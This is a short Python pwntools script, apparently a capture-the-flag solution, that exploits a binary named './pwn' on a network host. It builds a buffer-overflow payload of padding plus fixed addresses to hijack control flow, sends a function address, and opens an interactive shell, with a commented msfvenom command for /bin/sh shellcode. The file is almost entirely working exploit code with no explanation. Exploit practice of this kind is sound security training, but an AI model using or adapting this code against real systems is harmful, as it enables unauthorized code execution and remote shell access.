#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-05-13 20:17:31
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug")
DEBUG = 0
target = "./pwn"
remote_ip = "192.168.5.56"
port = 8888
rop = roputils.ROP(target)
# bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target)
	# gdb.attach(p,"b*0x8048572\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

payload = "a"*0x60+p32(0x0804A004)
# +p32(0x0804A028)
print len(payload)
sl(payload)
sl(str(0x080485E3))
# ru("e1 : ")
# sl(str(0x528E6))
# ru("e2 : ")
# sl(str(0xCC07C9))
p.interactive()